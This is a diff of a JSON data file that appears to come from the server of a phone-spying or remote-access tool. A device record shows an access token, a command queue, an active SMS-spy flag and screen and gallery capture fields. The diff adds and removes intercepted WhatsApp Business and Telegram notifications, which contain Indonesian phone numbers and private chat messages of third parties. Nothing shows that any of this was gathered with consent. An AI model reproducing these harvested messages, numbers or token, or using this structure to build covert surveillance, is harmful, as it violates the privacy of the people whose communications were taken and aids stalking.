@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633422751,
+    "lastSeen": 1775633425696,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎215 pesan dari 4 chat",
+        "time": "08/04 14:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633425714
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "taruu di gb ajaaa",
+        "time": "08/04 14:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633425703
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎214 pesan dari 4 chat",
+        "time": "08/04 14:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633423755
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "manaaa naxrat tutorial nya",
+        "time": "08/04 14:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633423725
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:16",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632572736
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "11 new messages from 11 chats",
-        "time": "08/04 14:16",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632572632
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "Buat aja videonya llu Taru di gb",
-        "time": "08/04 14:15",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632559393
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "Buat aja videonya llu Taru di gb",
-        "time": "08/04 14:15",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632559316
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:15",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632527337
       }
     ],
     "galleryPhotos": [],
